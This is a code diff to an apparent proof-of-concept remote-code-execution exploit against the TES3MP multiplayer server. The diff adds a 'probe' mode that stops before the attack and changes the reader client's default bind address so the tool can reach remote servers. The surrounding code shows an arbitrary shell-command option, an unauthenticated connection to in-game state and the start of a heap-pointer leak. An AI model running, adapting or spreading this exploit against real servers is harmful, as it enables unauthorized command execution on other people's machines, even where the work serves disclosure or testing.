@@ -50,6 +50,7 @@ static int g_port = 25565;
 static const char *g_token = "0.8.11068954091c54d0596037c4fb54d2812313b7582a1"; // TES3MP_VERSION+PROTO+commitHash
 static const char *g_srvpass = "";   // the actual server password (ID_SYSTEM_HANDSHAKE field 2)
 static int g_verbose = 0;
+static int g_probe = 0;   // connect both clients, reach POSTLOADED, report, and STOP (touches no memory)
 static std::vector<std::pair<std::string, unsigned>> g_files = {{"Morrowind.esm", 0x7B6AF5B9u}};
 
 static void vlog(const char *f, ...) { if (!g_verbose) return; va_list a; va_start(a, f); vfprintf(stderr, f, a); va_end(a); }
@@ -283,6 +284,8 @@ static void usage(const char *a0)
       "  -b, --bind <ip>             local address for the second (reader) client (default 127.0.0.2)\n"
       "  -n, --name <base>           player name prefix (default: rce)\n"
       "  -C, --cell <name>           cell to meet in (default: ExploitCell)\n"
+      "  -p, --probe                 connect both clients to POSTLOADED, report reachability, and STOP.\n"
+      "                              Touches no server memory: safe to run against a live server.\n"
       "  -v, --verbose               show relay parsing\n"
       "  -h, --help                  this text\n\n"
       "Payload must exit 0 to leave the server running: strlen's return value becomes the command's\n"
@@ -293,14 +296,19 @@ int main(int argc, char **argv)
 {
     setvbuf(stdout, 0, _IONBF, 0);
     const char *cmd = "touch /tmp/tes3mp-rce-proof";
-    const char *bind2 = "127.0.0.2", *nameBase = "rce", *cell = "ExploitCell";
+    // Reader binds to "any" by default. A Linux-only loopback alias like 127.0.0.2 does not exist on
+    // macOS (lo0 has only 127.0.0.1) and cannot route to a remote server anyway; "" lets the OS pick the
+    // egress interface, so A and R simply get two source ports from the same address, which the server
+    // keys apart by SystemAddress. Override with -b only if you specifically need a fixed source address.
+    const char *bind2 = "", *nameBase = "rce", *cell = "ExploitCell";
     static struct option lo[] = {
         {"server-password", required_argument, 0, 'P'}, {"command", required_argument, 0, 'c'},
         {"token", required_argument, 0, 't'}, {"bind", required_argument, 0, 'b'},
         {"name", required_argument, 0, 'n'}, {"cell", required_argument, 0, 'C'},
+        {"probe", no_argument, 0, 'p'},
         {"verbose", no_argument, 0, 'v'}, {"help", no_argument, 0, 'h'}, {0, 0, 0, 0}};
     int c;
-    while ((c = getopt_long(argc, argv, "P:c:t:b:n:C:vh", lo, 0)) != -1) {
+    while ((c = getopt_long(argc, argv, "P:c:t:b:n:C:pvh", lo, 0)) != -1) {
         switch (c) {
             case 'P': g_srvpass = optarg; break;
             case 'c': cmd = optarg; break;
@@ -308,6 +316,7 @@ int main(int argc, char **argv)
             case 'b': bind2 = optarg; break;
             case 'n': nameBase = optarg; break;
             case 'C': cell = optarg; break;
+            case 'p': g_probe = 1; break;
             case 'v': g_verbose = 1; break;
             default: usage(argv[0]); return 2;
         }
@@ -334,6 +343,13 @@ int main(int argc, char **argv)
     }
     loadCell(A, cell); loadCell(R, cell); drainboth(A, R, 600);
     printf("[+] both clients POSTLOADED in %s (no account, never logged in)\n", cell);
+
+    if (g_probe) {
+        printf("[probe] reachable and handshake accepted. Both clients are in-cell.\n");
+        printf("[probe] this is the point the exploit begins; stopping here without touching server memory.\n");
+        printf("[probe] drop -p (and set -c) to run the full chain.\n");
+        return 0;
+    }
 
     // 1. a live heap pointer (chatMessage's buffer). Not the base: only a valid writable address.
     for (Packet *p = R.peer->Receive(); p; R.peer->DeallocatePacket(p), p = R.peer->Receive());
